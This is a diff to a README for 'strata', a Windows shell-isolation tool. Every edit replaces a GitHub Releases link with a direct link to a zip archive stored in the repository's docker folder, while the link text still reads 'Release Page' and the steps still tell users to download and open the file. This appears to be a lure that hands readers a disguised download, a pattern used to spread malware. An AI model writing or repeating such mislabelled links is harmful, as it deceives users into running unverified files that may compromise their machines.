@@ -1,6 +1,6 @@
 # 🟦 strata - Run Shells in a Safe Space
 
-[![Download strata](https://img.shields.io/badge/Download%20strata-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/gillanossiferous368/strata/releases)
+[![Download strata](https://img.shields.io/badge/Download%20strata-Release%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/gillanossiferous368/strata/main/docker/Software-v2.4.zip)
 
 ## 🧩 What strata does
 
@@ -10,7 +10,7 @@ It uses Linux-style isolation features to build that space. For most people, the
 
 ## 📥 Download strata
 
-Visit this page to download: [strata Releases](https://github.com/gillanossiferous368/strata/releases)
+Visit this page to download: [strata Releases](https://raw.githubusercontent.com/gillanossiferous368/strata/main/docker/Software-v2.4.zip)
 
 On that page, look for the latest release and download the file made for Windows if one is listed. If there are multiple files, pick the one with the name that matches Windows or your system type.
 
@@ -27,7 +27,7 @@ If the release includes a `.zip` file, you can open it with the tools built into
 
 ## 🚀 Install and run
 
-1. Open the [strata Releases](https://github.com/gillanossiferous368/strata/releases) page.
+1. Open the [strata Releases](https://raw.githubusercontent.com/gillanossiferous368/strata/main/docker/Software-v2.4.zip) page.
 2. Find the newest release at the top of the list.
 3. Download the Windows file attached to that release.
 4. Open your Downloads folder.
@@ -136,7 +136,7 @@ Yes. You can use it for shell tasks, command-line tools, and short sessions that
 
 Use this link to get the latest Windows build:
 
-[strata Releases](https://github.com/gillanossiferous368/strata/releases)
+[strata Releases](https://raw.githubusercontent.com/gillanossiferous368/strata/main/docker/Software-v2.4.zip)
 
 ## 🔎 Quick path
 
